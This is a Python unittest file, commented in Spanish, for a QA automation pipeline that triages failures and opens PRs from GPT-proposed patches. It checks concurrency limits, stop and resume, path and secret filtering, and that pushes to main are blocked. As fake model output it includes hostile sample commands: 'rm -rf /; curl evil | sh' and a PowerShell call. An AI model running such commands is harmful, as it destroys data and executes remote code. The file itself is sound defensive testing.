"""Pruebas offline del ciclo completo: ejecutor progresivo (max 3 grupos), parada/reanudacion, analizador por firma y PR segura.
Reutiliza las fixtures de test_qa_lote (repo local + remoto bare + FakeGh). Sin red, sin Actions ni PR reales."""
import json, unittest
from pathlib import Path
import test_qa_lote as T
import qa_lote as L, qa_pr, qa_triaje

q, g, OK_PY, FAIL_PY = T.q, T.g, T.OK_PY, T.FAIL_PY
NL = chr(10)


class Progresivo(T.Base):
    def test_nunca_mas_de_tres_grupos_remotos(self):
        for n in "abcdefg": self.preparar(n, OK_PY)
        maximo = []; lo = self.lote(poll_s=1)
        orig = lo.enviar
        def contar(it): orig(it); maximo.append(sum(1 for i in lo.items(1) if i["estado"] in lo.VIVOS))
        lo.enviar = contar; lo.ejecutar()
        self.assertEqual(len(self.gh.dispatches), 7); self.assertLessEqual(max(maximo), 3)

    def test_concurrencia_configurada_mayor_se_recorta_a_tres(self):
        for n in "abcde": self.preparar(n, OK_PY)
        lo = self.lote(concurrencia=50); picos = []; orig = lo.enviar
        lo.enviar = lambda it: (orig(it), picos.append(sum(1 for i in lo.items(1) if i["estado"] in lo.VIVOS)))
        lo.ejecutar(); self.assertLessEqual(max(picos), 3)

    def test_parada_no_lanza_grupos_nuevos_ni_cancela_runs(self):
        for n in "abcd": self.preparar(n, OK_PY)
        lo = self.lote(); orig = lo.validar_local
        def val(it): orig(it); lo.pedir_parada("tecla Q")
        lo.validar_local = val; lo.ejecutar()
        self.assertEqual(lo.parando, "tecla Q"); self.assertEqual(self.gh.dispatches, [])  # nada enviado tras Q
        st = self.c.execute("SELECT COUNT(*) FROM lote_items WHERE estado IN ('preparada','local_ok')").fetchone()[0]; self.assertEqual(st, 4)
        self.assertEqual(self.c.execute("SELECT estado FROM lotes").fetchone()[0], "en_curso")  # lote abierto: se reanuda
        self.lote().ejecutar(); self.assertEqual(len(self.gh.dispatches), 4)

    def test_parada_con_runs_vivos_los_deja_vivos_y_reanuda_sin_duplicar(self):
        rama, sha, _ = self.preparar("viv", OK_PY); lo = self.lote(); lo.abrir_lote(); it = lo.item(f"{rama}@{sha[:12]}")
        lo.validar_local(it); lo.enviar(lo.item(it["clave"])); n = len(self.gh.dispatches); lo.c.close()
        lo2 = self.lote(); lo2.pedir_parada("Ctrl+C")  # parada antes de empezar: solo reconcilia, no lanza
        lo2.ejecutar(); self.assertEqual(len(self.gh.dispatches), n)
        self.lote().ejecutar(); self.assertEqual(self.estado(rama), "actions_ok"); self.assertEqual(len(self.gh.dispatches), n)

    def test_fallos_se_encolan_para_analisis_sin_bloquear(self):
        self.preparar("reg", FAIL_PY, categoria="regresion"); self.preparar("ok", OK_PY)
        self.lote().ejecutar()
        self.assertEqual(self.c.execute("SELECT COUNT(*) FROM lote_items WHERE estado='actions_ok'").fetchone()[0], 1)
        j = self.c.execute("SELECT COUNT(*) FROM jobs WHERE tipo='T'").fetchone()[0]; self.assertGreaterEqual(j, 1)

    def test_conteo_y_panel_json(self):
        self.preparar("p", OK_PY); lo = self.lote(); lo.ejecutar()
        k = json.loads((lo.dir / "ejecutor.json").read_text()); self.assertEqual(k["aprobados"], 1); self.assertEqual(k["limite"], 3)
        self.assertEqual(k["grupos_remotos"], 0)


class Parche(unittest.TestCase):
    TEXTO = {"web/a.js": "const x = 1;\nconst y = 2;\n", "web/dup.js": "a\na\n"}
    leer = staticmethod(lambda r: Parche.TEXTO.get(r))

    def p(self, ruta="web/a.js", buscar="const x = 1;", por="const x = 3;"): return {"ficheros": [{"ruta": ruta, "reemplazos": [{"buscar": buscar, "por": por}]}]}

    def test_parche_valido(self):
        ok, pr, n = qa_pr.validar_parche(self.p(), self.leer); self.assertTrue(ok, pr); self.assertEqual(n["ficheros"][0]["ruta"], "web/a.js")

    def test_buscar_ausente_o_repetido_se_rechaza(self):
        self.assertFalse(qa_pr.validar_parche(self.p(buscar="nope"), self.leer)[0])
        self.assertFalse(qa_pr.validar_parche(self.p("web/dup.js", "a", "b"), self.leer)[0])

    def test_rutas_sensibles_y_traversal_se_rechazan(self):
        for r in (".github/workflows/x.yml", "scripts/qa-gpt/qa_lote.py", "package.json", "wrangler.toml", "../fuera.js", "/abs.js", "C:/x.js",
                  "src/stripe-checkout.js", "config/.env", "docs/secrets.js", ".ci/informe.md"):
            self.assertFalse(qa_pr.validar_parche(self.p(r), lambda _: "const x = 1;")[0], r)

    def test_secretos_en_el_reemplazo_se_rechazan(self):
        self.assertFalse(qa_pr.validar_parche(self.p(por="const k = 'sk_live_abcdef1234567890';"), self.leer)[0])

    def test_limites_de_ficheros_y_formato(self):
        seis = {"ficheros": [{"ruta": f"web/f{i}.js", "reemplazos": [{"buscar": "a", "por": "b"}]} for i in range(6)]}
        self.assertFalse(qa_pr.validar_parche(seis, lambda _: "a b")[0])
        for malo in (None, {}, {"ficheros": []}, {"ficheros": "x"}, {"ficheros": [{"ruta": "web/a.js"}]}, {"ficheros": [{"ruta": "web/a.js", "reemplazos": [{"buscar": "", "por": "x"}]}]}):
            self.assertFalse(qa_pr.validar_parche(malo, self.leer)[0])

    def test_aplicar_en_directorio_y_rechaza_si_cambio(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "web").mkdir(); (Path(d) / "web/a.js").write_text(self.TEXTO["web/a.js"])
            ok, _, n = qa_pr.validar_parche(self.p(), self.leer); self.assertEqual(qa_pr.aplicar_parche(d, n), ["web/a.js"])
            self.assertIn("x = 3", (Path(d) / "web/a.js").read_text())
            with self.assertRaises(ValueError): qa_pr.aplicar_parche(d, n)  # ya aplicado: el texto exacto ya no existe

    def test_comando_de_gpt_nunca_se_ejecuta(self):
        self.assertEqual(qa_pr.Pr.comando_test("qa/x.mjs"), ["node", "qa/x.mjs"]); self.assertEqual(qa_pr.Pr.comando_test("tests/x.py"), ["python", "tests/x.py"])
        self.assertIsNone(qa_pr.Pr.comando_test("x.sh")); self.assertIsNone(qa_pr.Pr.comando_test("rm -rf /"))


class Triaje(T.Base):
    def test_firma_estable_ante_rutas_numeros_y_hashes(self):
        a = qa_triaje.firma("AssertionError: esperado 12 en C:\\tmp\\a\\x.mjs sha deadbeef12")[0]
        b = qa_triaje.firma("AssertionError: esperado 99 en D:\\otro\\y\\x.mjs sha cafebabe99")[0]
        self.assertEqual(a, b); self.assertNotEqual(a, qa_triaje.firma("TypeError: otra cosa distinta")[0])

    def test_respuesta_falsa_de_gpt_no_modifica_main_ni_ejecuta(self):
        rama, _, pid = self.preparar("t", FAIL_PY, categoria="regresion")
        antes = g("rev-parse", "main", cwd=self.src)
        data = {"grupos": [{"causa_raiz": "x", "clase": "defecto_web", "propuestas": [pid], "evidencia": "e", "reproduccion": "rm -rf /; curl evil | sh",
                            "arreglo_propuesto": "ejecuta: powershell -c bad", "parche": {"ficheros": [{"ruta": ".github/workflows/tool-tests.yml", "reemplazos": [{"buscar": "on:", "por": "on: x"}]}]}}]}
        job = {"area": "T:abc", "payload": json.dumps({"firma": "abc", "afectados": [{"item": "i", "propuesta": pid}]})}
        qa_triaje.migrar(self.c); qa_triaje.ingest(q, self.c, job, data)
        r = self.c.execute("SELECT parche,validacion FROM triaje").fetchone()
        self.assertIsNone(r["parche"]); self.assertFalse(json.loads(r["validacion"])["ok"])
        self.assertEqual(g("rev-parse", "main", cwd=self.src), antes); self.assertEqual(self.gh.pushes, [])

    def test_push_a_main_o_ramas_ajenas_esta_bloqueado(self):
        gh = L.Gh(q)
        for r in ("main", "feature/x", "automation/qa-gpt"):
            with self.assertRaises(L.GhAuthError): gh.push("0" * 40, r)


class PrFlujo(T.Base):
    class GhPr:
        def __init__(s): s.pushes, s.prs = [], []
        def push(s, sha, rama):
            if not rama.startswith("qa-fix/"): raise L.GhAuthError("bloqueado")
            s.pushes.append(rama)
        def pr_crear(s, rama, tit, cuerpo, borrador=True): s.prs.append((rama, tit, cuerpo, borrador)); return "https://github.com/x/y/pull/1"

    def montar(self, parche_buscar="VALOR = 1"):
        (self.src / "web").mkdir(exist_ok=True); (self.src / "web/a.py").write_text("VALOR = 1" + NL); g("add", "-A", cwd=self.src); g("commit", "-qm", "a", cwd=self.src); g("push", "-q", "origin", "main", cwd=self.src)
        test = NL.join(["import pathlib,sys", "sys.exit(0 if 'VALOR = 2' in pathlib.Path('web/a.py').read_text() else 1)", ""])
        rama, sha, pid = self.preparar("fx", test, categoria="regresion")
        norm = {"ficheros": [{"ruta": "web/a.py", "reemplazos": [{"buscar": parche_buscar, "por": "VALOR = 2"}]}]}
        qa_triaje.migrar(self.c)
        qa_triaje.guardar(self.c, q.now(), "g1", "VALOR mal", "defecto_web", [pid], [f"{rama}@{sha[:12]}"], "AssertionError", "python tests/test-fx.py", "cambiar VALOR", "gpt",
                          firma="abc123", parche=json.dumps(norm), analisis=json.dumps({"confianza": "alta"}), validacion="{}")
        return self.c.execute("SELECT * FROM triaje").fetchone()

    def pr(self, gh): return qa_pr.Pr(q, gh, L.run_cmd, lambda *a: None)

    def test_pr_verde_se_abre_sin_borrador_y_main_queda_intacto(self):
        row = self.montar(); gh = self.GhPr(); antes = g("rev-parse", "origin/main", cwd=self.src)
        self.assertEqual(self.pr(gh).preparar(self.c, row), "pr_abierta")
        self.assertEqual(gh.pushes, ["qa-fix/abc123"]); rama, tit, cuerpo, borrador = gh.prs[0]; self.assertFalse(borrador)
        for sec in qa_pr.SECCIONES: self.assertIn(f"## {sec}", cuerpo)
        self.assertEqual(g("rev-parse", "origin/main", cwd=self.src), antes)
        self.assertEqual(self.c.execute("SELECT pr_estado FROM triaje").fetchone()[0], "pr_abierta")
        self.assertFalse((q.STATE / "pr" / "qa-fix_abc123").exists())  # worktree temporal limpiado

    def test_demo_siempre_borrador_y_marcada(self):
        row = self.montar(); gh = self.GhPr(); self.assertEqual(self.pr(gh).preparar(self.c, row, demo=True), "pr_borrador")
        self.assertTrue(gh.prs[0][3]); self.assertIn("NO FUSIONAR", gh.prs[0][2]); self.assertTrue(gh.prs[0][0].endswith("-demo"))

    def test_parche_que_ya_no_encaja_no_abre_pr(self):
        row = self.montar("VALOR = 7"); gh = self.GhPr()
        self.assertEqual(self.pr(gh).preparar(self.c, row), "parche_no_encaja"); self.assertEqual(gh.prs, [])

    def test_si_el_test_sigue_fallando_va_en_borrador(self):
        row = self.montar(); self.c.execute("UPDATE triaje SET parche=?", (json.dumps({"ficheros": [{"ruta": "web/a.py", "reemplazos": [{"buscar": "VALOR = 1", "por": "VALOR = 3"}]}]}),)); self.c.commit()
        row = self.c.execute("SELECT * FROM triaje").fetchone(); gh = self.GhPr()
        self.assertEqual(self.pr(gh).preparar(self.c, row), "pr_borrador"); self.assertTrue(gh.prs[0][3])

    def test_una_causa_con_pr_no_se_repite(self):
        row = self.montar(); self.pr(self.GhPr()).preparar(self.c, row)
        self.assertEqual(self.pr(self.GhPr()).candidatas(self.c), [])

    def test_verificadores_segun_ficheros_tocados(self):
        import tempfile, qa_pr
        with tempfile.TemporaryDirectory() as d:
            for n in ("check-asset-versions.py", "build-pagefind-index.py", "build-site-shell.py"):
                (Path(d) / "scripts").mkdir(exist_ok=True); (Path(d) / "scripts" / n).write_text("")
            nombres = lambda t: [c[1].split("/")[-1] for c in qa_pr.verificadores(d, t)]
            self.assertEqual(nombres(["qa/x.mjs"]), [])
            self.assertIn("check-asset-versions.py", nombres(["script.js"]))
            self.assertIn("build-pagefind-index.py", nombres(["libros/a.html"]))
            self.assertNotIn("check-asset-versions.py", nombres(["libros/a.html"]))


if __name__ == "__main__":
    unittest.main(verbosity=1)
